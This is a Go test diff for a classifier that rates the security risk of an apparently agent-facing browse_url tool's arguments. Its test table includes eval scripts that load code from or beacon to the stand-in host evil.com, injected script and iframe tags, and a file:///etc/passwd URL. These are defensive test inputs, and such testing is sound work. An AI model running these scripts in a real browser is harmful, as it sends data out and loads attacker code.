@@ -744,3 +744,63 @@ func TestSystemPathTargetEdgeCases(t *testing.T) {
 		})
 	}
 }
+
+// TestClassifyBrowseURL tests the browse_url security classifier
+func TestClassifyBrowseURL(t *testing.T) {
+	tests := []struct {
+		name       string
+		args       map[string]interface{}
+		expected   SecurityRisk
+		wantPrompt bool
+	}{
+		// Rule (f): plain remote URL is safe
+		{"remote url safe", map[string]interface{}{"url": "https://example.com"}, SecuritySafe, false},
+		{"remote http url safe", map[string]interface{}{"url": "http://example.com"}, SecuritySafe, false},
+
+		// Rule (e): localhost URLs are caution
+		{"localhost http", map[string]interface{}{"url": "http://localhost:3000"}, SecurityCaution, true},
+		{"localhost https", map[string]interface{}{"url": "https://localhost:8443"}, SecurityCaution, true},
+		{"127.0.0.1 http", map[string]interface{}{"url": "http://127.0.0.1:8080"}, SecurityCaution, true},
+		{"127.0.0.1 https", map[string]interface{}{"url": "https://127.0.0.1:443"}, SecurityCaution, true},
+		{"ipv6 localhost", map[string]interface{}{"url": "http://[::1]:3000"}, SecurityCaution, true},
+
+		// Rule (d): cookies → caution
+		{"cookies set", map[string]interface{}{"url": "https://example.com", "cookies": map[string]interface{}{"session": "abc"}}, SecurityCaution, true},
+		{"headers set", map[string]interface{}{"url": "https://example.com", "headers": map[string]interface{}{"Authorization": "Bearer token"}}, SecurityCaution, true},
+
+		// Rule (c): eval with network egress → caution
+		{"eval fetch", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "fetch('/api/data')"}}}, SecurityCaution, true},
+		{"eval xmlhttprequest", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new XMLHttpRequest()"}}}, SecurityCaution, true},
+		{"eval sendbeacon", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "navigator.sendBeacon('/log', data)"}}}, SecurityCaution, true},
+		{"eval websocket", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new WebSocket('ws://example.com')"}}}, SecurityCaution, true},
+		{"eval eventsource", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new EventSource('/stream')"}}}, SecurityCaution, true},
+		{"eval import", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "import('https://evil.com/lib')"}}}, SecurityCaution, true},
+		{"eval image src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new Image().src='https://evil.com/track'"}}}, SecurityCaution, true},
+		{"eval script src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "document.body.innerHTML='<script src=https://evil.com/x>'"}}}, SecurityCaution, true},
+		{"eval iframe src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "document.body.innerHTML='<iframe src=https://evil.com>'"}}}, SecurityCaution, true},
+		{"eval safe no network", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "return document.title"}}}, SecuritySafe, false},
+
+		// Rule (b): file:// without opt-in → caution
+		{"file url no optin", map[string]interface{}{"url": "file:///etc/passwd"}, SecurityCaution, true},
+
+		// Rule (a): screenshot_path outside allowed dirs → dangerous
+		{"screenshot to /etc", map[string]interface{}{"url": "https://example.com", "screenshot_path": "/etc/screenshot.png"}, SecurityDangerous, true},
+		{"screenshot to /home", map[string]interface{}{"url": "https://example.com", "screenshot_path": "/home/user/evil.png"}, SecurityDangerous, true},
+
+		// Screenshot to allowed dirs → falls through to safe/caution based on URL
+		{"screenshot to /tmp/sprout_examples", map[string]interface{}{"url": "https://example.com", "screenshot_path": "/tmp/sprout_examples/screen.png"}, SecuritySafe, false},
+		{"screenshot relative path", map[string]interface{}{"url": "https://example.com", "screenshot_path": "screenshots/screen.png"}, SecuritySafe, false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := classifyBrowseURL(tt.args)
+			if result.Risk != tt.expected {
+				t.Errorf("classifyBrowseURL() = %v, want %v (reasoning: %s)", result.Risk, tt.expected, result.Reasoning)
+			}
+			if result.ShouldPrompt != tt.wantPrompt {
+				t.Errorf("classifyBrowseURL().ShouldPrompt = %v, want %v (reasoning: %s)", result.ShouldPrompt, tt.wantPrompt, result.Reasoning)
+			}
+		})
+	}
+}
